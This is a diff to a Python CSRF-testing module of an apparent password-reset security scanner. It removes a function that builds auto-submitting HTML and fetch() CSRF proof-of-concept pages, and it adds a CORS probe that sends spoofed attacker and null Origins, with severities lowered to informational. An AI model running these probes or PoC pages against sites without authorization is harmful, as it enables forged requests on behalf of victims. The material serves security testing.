@@ -2,7 +2,6 @@
 import sys
 sys.dont_write_bytecode = True
 
-import urllib.parse
 from utils.style import Colors
 from utils.utils import requests, re
 
@@ -44,73 +43,69 @@ def _strip_csrf_from_body(body, csrf_body_token):
     ).lstrip("&")
 
 
-_POC_STYLE = (
-    "<style>"
-    "body{font-family:monospace;background:#111;color:#ccc;padding:20px;margin:0}"
-    "h2{color:#ff6b6b;margin:0 0 12px}"
-    "code{color:#f9a825;word-break:break-all}"
-    ".info{background:#1e1e1e;padding:10px 14px;border-left:3px solid #ff6b6b;"
-    "margin:12px 0;font-size:13px;line-height:1.6}"
-    ".result{padding:8px 12px;margin-top:12px;border-radius:4px;font-size:14px}"
-    ".ok{background:#1a3a1a;color:#4caf50}"
-    ".ko{background:#3a1a1a;color:#ff6b6b}"
-    "</style>"
-)
-
-
-def _build_html_poc(uri, method, body, content_type):
-    if content_type == "json":
-        safe_body = (body or "{}").replace("\\", "\\\\").replace("`", "\\`").replace("</", "<\\/")
-        return (
-            f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
-            f"<title>CSRF PoC</title>{_POC_STYLE}</head><body>"
-            f"<h2>CSRF PoC — GimmeYourPassword</h2>"
-            f"<div class='info'>"
-            f"<b>Target:</b> <code>{uri}</code><br>"
-            f"<b>Method:</b> <code>{method}</code> &nbsp;"
-            f"<b>Type:</b> <code>JSON / fetch</code>"
-            f"</div>"
-            f"<div id='r' class='result'>Sending...</div>"
-            f"<script>"
-            f"fetch('{uri}',{{method:'{method}',"
-            f"headers:{{'Content-Type':'application/json'}},"
-            f"credentials:'include',body:`{safe_body}`}})"
-            f".then(r=>{{var e=document.getElementById('r');"
-            f"e.textContent='HTTP '+r.status+' — '+(r.status<400?'Accepted (CSRF confirmed!)':'Rejected');"
-            f"e.className='result '+(r.status<400?'ok':'ko')}})"
-            f".catch(e=>{{var el=document.getElementById('r');"
-            f"el.textContent='Error: '+e+' (CORS blocked — try same-origin delivery)';"
-            f"el.className='result ko'}});"
-            f"</script></body></html>"
-        )
-
-    # Form-urlencoded / other
-    fields_html = ""
-    if body:
-        try:
-            parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
-            for k, vals in parsed.items():
-                for v in vals:
-                    safe_k = k.replace('"', "&quot;").replace("'", "&#39;")
-                    safe_v = v.replace('"', "&quot;").replace("'", "&#39;")
-                    fields_html += f'  <input type="hidden" name="{safe_k}" value="{safe_v}">\n'
-        except Exception:
-            fields_html = f"  <!-- raw body: {body} -->\n"
-
-    form_method = method if method in ("GET", "POST") else "POST"
-    return (
-        f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
-        f"<title>CSRF PoC</title>{_POC_STYLE}</head><body>"
-        f"<h2>CSRF PoC — GimmeYourPassword</h2>"
-        f"<div class='info'>"
-        f"<b>Target:</b> <code>{uri}</code><br>"
-        f"<b>Method:</b> <code>{form_method}</code> &nbsp;"
-        f"<b>Type:</b> <code>form-submit</code>"
-        f"</div>"
-        f"<form action='{uri}' method='{form_method}' id='f'>\n{fields_html}</form>"
-        f"<script>document.getElementById('f').submit();</script>"
-        f"</body></html>"
+def _probe_cors(method, uri, headers, body, origin, proxies):
+    """Send the request with a given Origin and return (ACAO, ACAC-bool)."""
+    h = dict(headers)
+    h["Origin"] = origin
+    resp = requests.request(
+        method=method, url=uri, headers=h,
+        data=body or None, verify=False, allow_redirects=False,
+        timeout=10, proxies=proxies,
     )
+    acao = resp.headers.get("Access-Control-Allow-Origin")
+    acac = resp.headers.get("Access-Control-Allow-Credentials", "").strip().lower() == "true"
+    return acao, acac
+
+
+def _cors_analysis(method, uri, headers, body, proxies):
+    """
+    Detect dangerous CORS policies by reflecting a unique attacker Origin and a
+    null Origin, then reading Access-Control-Allow-Origin / -Allow-Credentials.
+
+    The high-impact bug is "reflect arbitrary Origin + Allow-Credentials: true":
+    any website can then read this endpoint's response with the victim's cookies.
+    """
+    print(f"{Colors.CYAN} └─ CORS policy check{Colors.RESET}")
+
+    test_origin = "https://gyp-cors-probe.example"
+    try:
+        acao, acac = _probe_cors(method, uri, headers, body, test_origin, proxies)
+    except requests.RequestException as e:
+        print(f"  {Colors.RED}[!] {e}{Colors.RESET}")
+        return
+
+    if acao is None:
+        print(f"{Colors.GREEN}   └── [OK] No Access-Control-Allow-Origin returned for a foreign origin{Colors.RESET}")
+        return
+
+    # Arbitrary-origin reflection. NOTE on severity: reflect+credentials is only
+    # *impactful* when the response carries victim-specific / session data that an
+    # attacker couldn't obtain themselves. A public endpoint that returns the same
+    # thing to everyone (like a reset-request) leaks nothing → most BB programs
+    # rate it Informational. So we report the misconfig as a low-severity lead and
+    # tell the user what to verify to escalate it, instead of over-claiming HIGH.
+    if acao == test_origin and acac:
+        print(f"{Colors.YELLOW}   └── [INFO] CORS misconfig: reflects arbitrary Origin + Allow-Credentials:true{Colors.RESET}")
+        print(f"{Colors.YELLOW}       ACAO: {acao} | ACAC: true{Colors.RESET}")
+        print(f"{Colors.CYAN}       impact conditional — only exploitable if THIS or a sibling /api endpoint{Colors.RESET}")
+        print(f"{Colors.CYAN}       returns victim/session data. Replay on an authenticated endpoint to confirm.{Colors.RESET}")
+    elif acao == test_origin:
+        print(f"{Colors.CYAN}   └── [INFO] CORS reflects arbitrary Origin (no credentials) — low impact{Colors.RESET}")
+    elif acao == "*" and acac:
+        print(f"{Colors.YELLOW}   └── [INFO] ACAO:* with Allow-Credentials:true (browsers block this combo, but misconfigured){Colors.RESET}")
+    elif acao == "*":
+        print(f"{Colors.CYAN}   └── [INFO] ACAO:* (wildcard) — public data only, no credentialed read{Colors.RESET}")
+    else:
+        print(f"{Colors.GREEN}   └── [OK] ACAO not reflected ({acao}){Colors.RESET}")
+
+    # null-origin (sandboxed iframe / data: URI). Same conditional-impact caveat.
+    try:
+        nacao, nacac = _probe_cors(method, uri, headers, body, "null", proxies)
+        if nacao == "null":
+            print(f"{Colors.CYAN}   └── [INFO] CORS also allows Origin: null{' + credentials' if nacac else ''} "
+                  f"(sandboxed-iframe reachable){Colors.RESET}")
+    except requests.RequestException:
+        pass
 
 
 def csrf(url, parsed_req, baseline, interact, email, proxy=None):
@@ -119,8 +114,9 @@ def csrf(url, parsed_req, baseline, interact, email, proxy=None):
 
     Phase 1: Detect whether a CSRF token exists in the request.
     Phase 2: Simulate a cross-origin request (Origin: evil.com, Referer: evil.com)
-             with CSRF tokens stripped — if accepted = CSRF confirmed.
-    Phase 3: Generate an HTML PoC form / fetch() payload.
+             with CSRF tokens stripped. Reported as INFO only: CSRF on a reset-
+             *request* endpoint has negligible impact (the victim can trigger the
+             same email themselves; no state change), so most BB programs reject it.
     """
     print(f"{Colors.CYAN} ├ CSRF analysis{Colors.RESET}")
 
@@ -134,12 +130,6 @@ def csrf(url, parsed_req, baseline, interact, email, proxy=None):
     uri = f"{scheme}://{original_host}{path}"
     proxies = {"http": proxy, "https": proxy} if proxy else None
 
-    content_type = "form"
-    for k, v in headers.items():
-        if k.lower() == "content-type" and "application/json" in v.lower():
-            content_type = "json"
-            break
-
     # --- Phase 1: Detection ---
     print(f"{Colors.CYAN} └─ CSRF protection detection{Colors.RESET}")
 
@@ -150,7 +140,21 @@ def csrf(url, parsed_req, baseline, interact, email, proxy=None):
     if csrf_body_token:
         print(f"{Colors.GREEN}   └── [INFO] CSRF body token present: {csrf_body_token}{Colors.RESET}")
     if not csrf_header and not csrf_body_token:
-        print(f"{Colors.YELLOW}   └── [HIGH] No CSRF token found in request{Colors.RESET}")
+        print(f"{Colors.CYAN}   └── [INFO] No CSRF token found in request{Colors.RESET}")
+
+    # --- CORS policy (independent of cookies: usually a gateway-wide config) ---
+    _cors_analysis(method, uri, headers, body, proxies)
+
+    # CSRF only makes sense when the browser auto-attaches ambient credentials,
+    # i.e. a session cookie. A public / bearer-token endpoint (no Cookie) is not
+    # CSRF-exploitable, so confirming "cross-origin accepted" there is a false
+    # positive — skip the confirmation phases.
+    has_cookie = any(k.lower() == "cookie" for k in headers)
+    has_bearer = any(k.lower() == "authorization" for k in headers)
+    if not has_cookie:
+        reason = "bearer/Authorization auth" if has_bearer else "no session cookie → public/unauthenticated endpoint"
+        print(f"{Colors.CYAN}   └── [i] {reason} — CSRF not applicable, cross-origin test skipped{Colors.RESET}")
+        return
 
     # --- Phase 2: Cross-origin simulation ---
     print(f"{Colors.CYAN} └─ Cross-origin request simulation{Colors.RESET}")
@@ -174,20 +178,15 @@ def csrf(url, parsed_req, baseline, interact, email, proxy=None):
         ratio = abs(rl - bl) / bl if bl > 0 else 0.0
 
         if resp.status_code == baseline["status"] and ratio < 0.15:
-            print(f"{Colors.RED}   └── [CRITICAL] Cross-origin request accepted (Origin: evil.com) → {resp.status_code} ≈ baseline{Colors.RESET}")
-            print(f"{Colors.RED}       CSRF confirmed — no origin validation{Colors.RESET}")
-            # Phase 3: PoC
-            print(f"{Colors.CYAN} └─ HTML PoC{Colors.RESET}")
-            print(f"{Colors.YELLOW}{_build_html_poc(uri, method, attack_body or body, content_type)}{Colors.RESET}")
+            # A reset-*request* endpoint only mails a link the victim can already
+            # request themselves → no state change, negligible impact. Informational,
+            # most BB programs won't accept it. No PoC emitted.
+            print(f"{Colors.CYAN}   └── [INFO] Cross-origin request accepted (Origin: evil.com) → {resp.status_code} ≈ baseline{Colors.RESET}")
+            print(f"{Colors.CYAN}       No origin validation, but low impact on a reset-request endpoint (self-triggerable, no state change){Colors.RESET}")
         elif resp.status_code in [403, 400]:
             print(f"{Colors.GREEN}   └── [OK] Cross-origin rejected: {resp.status_code}{Colors.RESET}")
         else:
-            print(f"{Colors.YELLOW}   └── [MEDIUM] [{baseline['status']} > {resp.status_code}] Δlen={abs(rl-bl)}b{Colors.RESET}")
+            print(f"{Colors.CYAN}   └── [INFO] [{baseline['status']} > {resp.status_code}] Δlen={abs(rl-bl)}b{Colors.RESET}")
 
     except requests.RequestException as e:
         print(f"  {Colors.RED}[!] {e}{Colors.RESET}")
-
-    # Always print PoC when no CSRF token at all
-    if not csrf_header and not csrf_body_token:
-        print(f"{Colors.CYAN} └─ HTML PoC (no CSRF token in request){Colors.RESET}")
-        print(f"{Colors.YELLOW}{_build_html_poc(uri, method, body, content_type)}{Colors.RESET}")
